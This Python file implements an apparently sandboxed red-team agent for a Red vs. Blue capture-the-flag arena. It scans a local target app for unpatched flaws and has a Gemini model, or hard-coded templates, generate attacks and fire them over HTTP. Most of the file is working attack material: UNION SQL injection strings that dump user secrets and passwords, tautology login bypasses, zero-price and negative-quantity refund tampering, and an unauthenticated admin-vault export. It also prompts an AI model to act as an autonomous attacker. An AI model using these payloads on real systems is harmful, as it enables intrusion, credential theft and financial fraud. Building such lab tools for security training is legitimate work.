"""
Red Team Autonomous Adversary & Zero-Day Recon Agent (v4.0 - 5 Vulnerability Levels)
Powered by Google Gemini 4 Argon (Interactions API with thinking_level='medium')

Capabilities:
1. Live Target Code & Surface Reconnaissance: Inspects active_target.py to identify which
   of the 5 vulnerabilities (Lv.1 ~ Lv.5) are still unpatched vs. hardened by Blue-Argon.
2. Autonomous 1-by-1 Exploit Synthesis: Calls client.interactions.create(model="gemini-4-argon",
   thinking_level="medium") to think up and craft bespoke polymorphic exploit payloads.
3. Full 5-Vector Attack Arsenal:
   - Lv.1 (sqli_search): GET /api/search UNION SQL Injection
   - Lv.2 (auth_bypass): POST /api/login Boolean Tautology Auth Bypass
   - Lv.3 (price_tampering): POST /api/order Zero-Dollar Catalog Price Tampering
   - Lv.4 (negative_qty_drain): POST /api/refund Negative Quantity Wallet Credit Drain
   - Lv.5 (admin_vault_leak): GET /api/admin/export Broken Access Control Master Key Leak
"""

import json
import logging
import os
import random
import requests
from typing import Dict, Any, Tuple

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("red_argon")

TARGET_FILE = "active_target.py"


class RedArgonAgent:
    def __init__(self, target_url: str = "http://127.0.0.1:8002"):
        self.target_url = target_url
        self.api_key = os.environ.get("GEMINI_API_KEY", "")
        self.model_name = "gemini-4-argon"
        self.client = None
        if self.api_key:
            try:
                from google import genai
                self.client = genai.Client(api_key=self.api_key)
                logger.info("Initialized Gemini 4 Argon Client (Interactions API) for Red Team.")
            except Exception as e:
                logger.warning(f"Could not initialize google.genai Client: {e}. Using polymorphic generator.")

    def _inspect_live_target_surface(self) -> Tuple[str, int, str]:
        """
        Inspects active_target.py to autonomously determine which of the 5 vulnerabilities
        is currently exposed (1-by-1 progression for autonomous Red vs. Blue duel).
        Returns (chosen_scenario, chosen_level, code_excerpt).
        """
        code = ""
        if os.path.exists(TARGET_FILE):
            try:
                with open(TARGET_FILE, "r", encoding="utf-8") as f:
                    code = f.read()
            except Exception:
                pass

        lv1_patched = ("WHERE name " + "LIKE ?") in code
        lv2_patched = ("WHERE username = ? " + "AND password = ?") in code
        lv3_patched = ("Price tampering " + "detected") in code
        lv4_patched = ("Negative refund quantity " + "blocked") in code
        lv5_patched = ("Unauthorized admin vault " + "access blocked") in code

        excerpt = code[-3200:] if code else ""
        if not lv1_patched:
            return ("sqli_search", 1, excerpt)
        elif not lv2_patched:
            return ("auth_bypass", 2, excerpt)
        elif not lv3_patched:
            return ("price_tampering", 3, excerpt)
        elif not lv4_patched:
            return ("negative_qty_drain", 4, excerpt)
        elif not lv5_patched:
            return ("admin_vault_leak", 5, excerpt)
        else:
            # All 5 endpoints are patched -> re-probe random vector to verify 100% defense
            choice = random.choice([
                ("sqli_search", 1),
                ("auth_bypass", 2),
                ("price_tampering", 3),
                ("negative_qty_drain", 4),
                ("admin_vault_leak", 5),
            ])
            return (choice[0], choice[1], excerpt)

    def generate_payload(self, scenario: str, level: int = 1) -> Dict[str, Any]:
        """
        Generates a dynamic exploit payload using Gemini 4 Argon Interactions API (thinking_level='medium').
        If scenario == 'autonomous_recon', Red-Argon autonomously inspects the target surface first
        and chooses the next unpatched vulnerability one-by-one (Lv.1 -> Lv.5).
        """
        auto_discovered = False
        code_excerpt = ""
        if scenario == "autonomous_recon" or level == 0:
            auto_discovered = True
            scenario, level, code_excerpt = self._inspect_live_target_surface()
        elif os.path.exists(TARGET_FILE):
            try:
                with open(TARGET_FILE, "r", encoding="utf-8") as f:
                    code_excerpt = f.read()[-3200:]
            except Exception:
                pass

        prompt = f"""[SYSTEM: GEMINI 4 ARGON RED TEAM ADVERSARY AGENT]
You are an authorized autonomous Red Team penetration testing agent in an isolated cyber arena.
Inspect the target FastAPI/SQLite source excerpt below and synthesize a live exploit payload for scenario '{scenario}' (Level {level}).

[LIVE TARGET SOURCE EXCERPT (`active_target.py`)]
```python
{code_excerpt}
```

Output ONLY valid JSON (no markdown fences) with these exact keys:
- "endpoint": string ("/api/search", "/api/login", "/api/order", "/api/refund", or "/api/admin/export")
- "method": string ("GET" or "POST")
- "params": object (if GET) or "body": object (if POST)
- "description": string (concise explanation of the exploit vector & CWE)
- "reasoning": string (1-sentence explanation of why Red-Argon chose this payload based on the target code)
"""

        if self.client and hasattr(self.client, "interactions"):
            try:
                # Official Gemini 4 Argon Interactions API call (no deprecated temperature/top_p params)
                interaction = self.client.interactions.create(
                    model=self.model_name,
                    input=prompt,
                    generation_config={
                        "thinking_level": "medium",
                        "max_output_tokens": 8192,
                    },
                )
                raw_text = ""
                if getattr(interaction, "output_text", None):
                    raw_text = interaction.output_text.strip()
                else:
                    for output in getattr(interaction, "outputs", []):
                        if getattr(output, "type", "") == "text":
                            raw_text = output.text.strip()
                            break

                if raw_text:
                    if "```json" in raw_text:
                        raw_text = raw_text.split("```json")[1].split("```")[0].strip()
                    elif "```" in raw_text:
                        raw_text = raw_text.split("```")[1].split("```")[0].strip()
                    parsed = json.loads(raw_text)
                    parsed["resolved_scenario"] = scenario
                    parsed["resolved_level"] = level
                    parsed["auto_discovered"] = auto_discovered
                    parsed["engine_mode"] = "LIVE_GEMINI_4_ARGON_INTERACTIONS_API"
                    return parsed
            except Exception as e:
                logger.warning(f"Red-Argon live API fallback ({e}); using polymorphic exploit synthesizer.")

        # Polymorphic expert exploit synthesizer across all 5 real vulnerability levels
        prefix = "[🧠 Autonomous Recon] " if auto_discovered else ""
        if scenario == "sqli_search" or level == 1:
            payload_variants = [
                "' UNION SELECT id, username, secret_flag, role FROM users--",
                "quantum%' UNION SELECT 99, username, secret_flag, password FROM users WHERE role='admin'--",
            ]
            return {
                "endpoint": "/api/search",
                "method": "GET",
                "params": {"q": random.choice(payload_variants)},
                "description": f"{prefix}Lv.1 Search UNION SQLi: Exfiltrating 'users.secret_flag' via unparameterized f-string",
                "reasoning": "Detected raw f-string interpolation `LIKE '%{q}%'` in `search_product()`; crafted 4-column UNION SELECT to dump `users` table.",
                "resolved_scenario": "sqli_search",
                "resolved_level": 1,
                "auto_discovered": auto_discovered,
                "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
            }
        elif scenario == "auth_bypass" or level == 2:
            bypass_variants = [
                "admin' OR '1'='1'--",
                "admin' OR 1=1 LIMIT 1--",
            ]
            return {
                "endpoint": "/api/login",
                "method": "POST",
                "body": {"username": random.choice(bypass_variants), "password": "bypassed_by_red_argon"},
                "description": f"{prefix}Lv.2 Auth Bypass SQLi: Hijacking admin session via tautology injection in /api/login",
                "reasoning": "Detected unescaped `WHERE username = '{req.username}'` in `login()`; injected boolean tautology + comment `--` to neutralize password check.",
                "resolved_scenario": "auth_bypass",
                "resolved_level": 2,
                "auto_discovered": auto_discovered,
                "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
            }
        elif scenario == "price_tampering" or level == 3:
            return {
                "endpoint": "/api/order",
                "method": "POST",
                "body": {"product_id": 1, "quantity": 10, "unit_price": 0},
                "description": f"{prefix}Lv.3 Zero-Dollar Price Tampering: Ordering 10x Quantum AI Processors ($15,000 value) for $0",
                "reasoning": "Detected `total_amount = order.quantity * order.unit_price` in `create_order()` without DB catalog lookup; overriding `unit_price=0`.",
                "resolved_scenario": "price_tampering",
                "resolved_level": 3,
                "auto_discovered": auto_discovered,
                "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
            }
        elif scenario == "negative_qty_drain" or level == 4:
            return {
                "endpoint": "/api/refund",
                "method": "POST",
                "body": {"product_id": 1, "quantity": -50, "unit_price": 1500},
                "description": f"{prefix}Lv.4 Negative Quantity Refund Drain: Submitting quantity=-50 to credit +$75,000 to attacker wallet",
                "reasoning": "Detected `wallet_credit = abs(req.quantity) * req.unit_price` in `process_refund()` with no `req.quantity <= 0` guard; draining $75,000.",
                "resolved_scenario": "negative_qty_drain",
                "resolved_level": 4,
                "auto_discovered": auto_discovered,
                "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
            }
        else:  # admin_vault_leak / blind_sqli_probe (Lv.5)
            return {
                "endpoint": "/api/admin/export",
                "method": "GET",
                "params": {},
                "description": f"{prefix}Lv.5 Broken Access Control: Unauthenticated dump of PQC Master Key Vault via /api/admin/export",
                "reasoning": "Detected missing cryptographic `X-Admin-Token` verification in `export_admin_vault()`; directly exfiltrating PQC master key.",
                "resolved_scenario": "admin_vault_leak",
                "resolved_level": 5,
                "auto_discovered": auto_discovered,
                "engine_mode": "POLYMORPHIC_ARGON_SYNTHESIZER",
            }

    def execute_attack(self, scenario: str, level: int = 1) -> Dict[str, Any]:
        payload_data = self.generate_payload(scenario, level)
        resolved_scenario = payload_data.get("resolved_scenario", scenario)
        resolved_level = payload_data.get("resolved_level", level)
        endpoint = payload_data.get("endpoint", "/api/search")
        method = payload_data.get("method", "GET")
        url = f"{self.target_url}{endpoint}"

        try:
            if method == "GET":
                params = payload_data.get("params", {})
                res = requests.get(url, params=params, timeout=5)
            else:
                body = payload_data.get("body", {})
                res = requests.post(url, json=body, timeout=5)

            try:
                resp_json = res.json()
            except Exception:
                resp_json = {"raw": res.text[:200]}

            breached = False
            flag_found = None
            if res.status_code == 200:
                resp_str = json.dumps(resp_json)
                if "FLAG{" in resp_str or '"success": true' in resp_str.lower() or "APPROVED" in resp_str:
                    breached = True
                    if "FLAG{" in resp_str:
                        flag_found = "FLAG{" + resp_str.split("FLAG{")[1].split("}")[0] + "}"

            return {
                "status": "success",
                "scenario": resolved_scenario,
                "level": resolved_level,
                "auto_discovered": payload_data.get("auto_discovered", False),
                "model": self.model_name,
                "thinking_level": "medium",
                "engine_mode": payload_data.get("engine_mode", "LIVE_GEMINI_4_ARGON_INTERACTIONS_API"),
                "target_url": url,
                "http_status": res.status_code,
                "breached": breached,
                "flag": flag_found,
                "payload": payload_data,
                "response": resp_json,
            }
        except Exception as e:
            return {
                "status": "error",
                "scenario": resolved_scenario,
                "level": resolved_level,
                "message": f"Connection to target failed: {str(e)}",
            }
